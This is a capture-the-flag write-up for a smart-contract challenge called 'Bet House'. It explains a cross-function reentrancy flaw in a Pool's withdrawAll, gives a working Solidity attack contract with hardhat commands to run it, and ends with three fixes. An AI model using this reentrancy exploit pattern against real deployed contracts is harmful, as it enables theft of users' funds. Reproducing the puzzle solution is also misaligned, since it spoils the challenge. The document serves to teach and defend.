# Level 34: Bet House

## Challenge Description

> Welcome to the Bet House.
>
> You start with 5 Pool Deposit Tokens (PDT).
>
> Could you master the art of strategic gambling and become a bettor?

## Contract Location

- **Instance Contract**: `contracts/level-34-bet-house/BetHouse.sol`
- **Solution Contract**: `contracts/level-34-bet-house/BetHouseAttack.sol`

## Understanding the Challenge

The challenge consists of three contracts:

### 1. BetHouse
```solidity
contract BetHouse {
    function makeBet(address bettor_) external {
        if (Pool(pool).balanceOf(msg.sender) < BET_PRICE) {  // 20 tokens
            revert InsufficientFunds();
        }
        if (!Pool(pool).depositsLocked(msg.sender)) revert FundsNotLocked();
        bettors[bettor_] = true;
    }
}
```

To become a bettor, you need:
- **20 wrapped tokens** in your balance
- **Locked deposits**

### 2. Pool
```solidity
contract Pool is ReentrancyGuard {
    function deposit(uint256 value_) external payable {
        // 0.001 ETH = 10 wrapped tokens (only once globally!)
        // 1 PDT = 1 wrapped token
    }
    
    function withdrawAll() external nonReentrant {
        // 1. Send PDT back
        // 2. Send ETH back via .call() ← EXTERNAL CALL
        // 3. Burn wrapped tokens ← HAPPENS AFTER EXTERNAL CALL!
    }
}
```

### 3. PoolToken
Standard ERC20 with mint/burn restricted to owner (Pool).

## The Problem

You start with only **5 PDT**, which gives you only **5 wrapped tokens**.

| Deposit | Wrapped Tokens |
|---------|----------------|
| 5 PDT | 5 tokens |
| 0.001 ETH | 10 tokens |
| **Total** | **15 tokens** |

But you need **20 tokens** to become a bettor!

## Vulnerability Analysis

### Cross-Function Reentrancy in `withdrawAll()`

```solidity
function withdrawAll() external nonReentrant {
    // 1. Send PDT to user (external call to ERC20)
    uint256 _depositedValue = depositedPDT[msg.sender];
    if (_depositedValue > 0) {
        depositedPDT[msg.sender] = 0;
        PoolToken(depositToken).transfer(msg.sender, _depositedValue);
    }

    // 2. Send ETH to user (EXTERNAL CALL - REENTRANCY POINT!)
    _depositedValue = depositedEther[msg.sender];
    if (_depositedValue > 0) {
        depositedEther[msg.sender] = 0;
        payable(msg.sender).call{value: _depositedValue}("");  // ← Callback here!
    }

    // 3. Burn wrapped tokens (HAPPENS AFTER EXTERNAL CALL!)
    PoolToken(wrappedToken).burn(msg.sender, balanceOf(msg.sender));
}
```

**The Critical Issue**: Wrapped tokens are burned **AFTER** the external ETH call.

During the ETH callback in `receive()`:
- Your `depositedPDT` and `depositedEther` are already zeroed
- But your **wrapped token balance is still intact**!
- You've also **received your PDT back**

### Why `nonReentrant` Doesn't Help

The `nonReentrant` modifier only prevents calling `withdrawAll()` again. But we can still call:
- `deposit()` - to re-deposit our PDT
- `lockDeposits()` - to lock our deposits
- `BetHouse.makeBet()` - to become a bettor!

## Exploit Strategy

```
Initial State: 5 PDT, 0 ETH (+ gas money)

Step 1: Deposit 5 PDT + 0.001 ETH
        → Get 15 wrapped tokens
        
Step 2: Call withdrawAll()
        ├─ PDT sent back (now have 5 PDT again)
        ├─ ETH callback triggers receive()
        │   ├─ Still have 15 wrapped tokens! (not burned yet)
        │   ├─ Re-deposit 5 PDT → now have 20 wrapped tokens!
        │   ├─ Call lockDeposits() → deposits are locked
        │   └─ Call makeBet() → SUCCESS! We're a bettor!
        └─ After callback: burn(20 tokens)
        
Final State: 0 wrapped tokens, BUT we're registered as a bettor!
```

## Solution Contract

```solidity
contract BetHouseAttack {
    bool private attacking;
    
    function attack() external payable {
        require(msg.value == 0.001 ether);
        
        // Approve and deposit PDT + ETH
        depositToken.approve(address(pool), type(uint256).max);
        pool.deposit{value: 0.001 ether}(5);  // 15 wrapped tokens
        
        // Trigger the exploit
        attacking = true;
        pool.withdrawAll();  // This calls our receive()
        attacking = false;
    }
    
    receive() external payable {
        if (attacking) {
            // At this point: 15 wrapped tokens, 5 PDT (just received)
            
            // Re-deposit PDT → 20 wrapped tokens!
            pool.deposit(5);
            
            // Lock deposits
            pool.lockDeposits();
            
            // Become a bettor!
            betHouse.makeBet(address(this));
            
            // After this returns, tokens are burned
            // But we're already a bettor!
        }
    }
}
```

## Running the Exploit

### 1. Deploy Instance Contract (Local Testing)
```bash
npx hardhat deploy --tags BetHouse --network localhost
```

### 2. Deploy Solution Contract
```bash
npx hardhat deploy --tags BetHouseAttack --network localhost
```

Or with a specific BetHouse address:
```bash
BET_HOUSE_ADDRESS=0x... npx hardhat deploy --tags BetHouseAttack --network sepolia
```

### 3. Execute Attack
```bash
npx hardhat run scripts/level-34-bet-house/attack.ts --network localhost
```

Or with environment variables:
```bash
BET_HOUSE_ADDRESS=0x... ATTACK_ADDRESS=0x... npx hardhat run scripts/level-34-bet-house/attack.ts --network sepolia
```

## Key Takeaways

### 1. Cross-Function Reentrancy
Even with `nonReentrant`, reentrancy can occur across different functions. The modifier only protects the specific function it's applied to.

### 2. Checks-Effects-Interactions Pattern
The contract violates this pattern:
- **Current**: Checks → Effects (partial) → Interactions → Effects (remaining)
- **Should be**: Checks → ALL Effects → Interactions

### 3. State Changes Before External Calls
Critical state changes (like burning tokens) should happen **before** any external calls, not after.

## Prevention

### Fix 1: Burn Tokens First
```solidity
function withdrawAll() external nonReentrant {
    // FIRST: Calculate and burn tokens
    uint256 tokenBalance = balanceOf(msg.sender);
    if (tokenBalance > 0) {
        PoolToken(wrappedToken).burn(msg.sender, tokenBalance);
    }
    
    // THEN: Send PDT
    uint256 pdtValue = depositedPDT[msg.sender];
    if (pdtValue > 0) {
        depositedPDT[msg.sender] = 0;
        PoolToken(depositToken).transfer(msg.sender, pdtValue);
    }
    
    // LAST: Send ETH
    uint256 ethValue = depositedEther[msg.sender];
    if (ethValue > 0) {
        depositedEther[msg.sender] = 0;
        payable(msg.sender).call{value: ethValue}("");
    }
}
```

### Fix 2: Use Pull Pattern for ETH
```solidity
mapping(address => uint256) public pendingWithdrawals;

function withdrawAll() external nonReentrant {
    // ... process PDT and burn tokens ...
    
    // Don't send ETH directly, let user pull it
    pendingWithdrawals[msg.sender] += depositedEther[msg.sender];
    depositedEther[msg.sender] = 0;
}

function claimETH() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    pendingWithdrawals[msg.sender] = 0;
    payable(msg.sender).call{value: amount}("");
}
```

### Fix 3: Lock All Operations During Withdrawal
```solidity
mapping(address => bool) private withdrawing;

modifier notWithdrawing() {
    require(!withdrawing[msg.sender], "Withdrawal in progress");
    _;
}

function deposit(uint256 value_) external payable notWithdrawing { ... }
function lockDeposits() external notWithdrawing { ... }

function withdrawAll() external nonReentrant {
    withdrawing[msg.sender] = true;
    // ... withdrawal logic ...
    withdrawing[msg.sender] = false;
}
```

## References

- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [Consensys: Reentrancy](https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/)
- [OpenZeppelin ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)
